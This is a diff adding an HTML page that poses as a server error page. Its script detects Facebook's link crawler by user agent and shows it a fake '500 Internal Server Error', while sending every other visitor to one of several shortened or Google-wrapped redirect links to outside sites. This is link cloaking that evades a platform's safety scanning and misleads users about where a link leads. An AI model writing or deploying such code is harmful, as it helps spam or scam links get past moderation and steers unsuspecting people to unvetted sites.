@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>503 Internal Server Error</title>
+    <script>
+        window.onload = function() {
+            // Check the user agent
+            const userAgent = navigator.userAgent;
+
+            // Simulate checking for Facebook's crawler
+            if (userAgent.includes('facebookexternalhit')) {
+                // Simulate sending a 500 error response
+                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
+                return; // Stop further execution
+            }
+
+            // Otherwise, redirect to a random page
+            const pages = [
+                "https://dub.sh/YeheliyoGithub",
+                "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://huththa.online/&ved=2ahUKEwjeuoSE6ZCLAxUiwjgGHVcZIeMQFnoECAoQAQ&usg=AOvVaw0V3QRO0tJYg9V41Ckz148H",
+                "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://badu9.com/&ved=2ahUKEwjSrP_H6M-LAxXjwjgGHVCzMLsQFnoECA0QAQ&usg=AOvVaw2a6EJW5T9xAtU8DoEHZEW2"
+            ];
+            const randomPage = pages[Math.floor(Math.random() * pages.length)];
+            window.location.href = randomPage;
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
